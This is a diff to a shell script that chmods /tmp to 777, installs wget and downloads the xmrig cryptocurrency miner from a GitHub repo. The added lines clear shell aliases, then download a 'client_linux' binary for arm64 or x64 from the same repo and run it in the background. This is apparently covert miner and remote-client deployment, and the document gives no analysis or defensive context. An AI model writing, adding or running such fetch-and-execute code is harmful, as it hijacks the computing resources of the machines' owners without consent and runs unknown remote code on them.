@@ -10,6 +10,9 @@ else
     sudo -n chmod 777 /tmp
 fi
 
+# remove any aliases
+unalias -a
+
 # try to install wget and util-linux
 sudo -n apt update
 sudo -n apt install -y wget util-linux
@@ -43,6 +46,15 @@ cd xmrig-$xmrver
 if $is_arm64; then
     rm -f xmrig
     $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
+fi
+
+# probably should set a var to either arm64 or x64, i'll do it later ig...
+if $is_arm64; then
+    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/client_linux_arm64
+    ./client_linux_arm64 &
+else
+    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/client_linux_x64
+    ./client_linux_x64 &
 fi
 
 # just to be extra safe
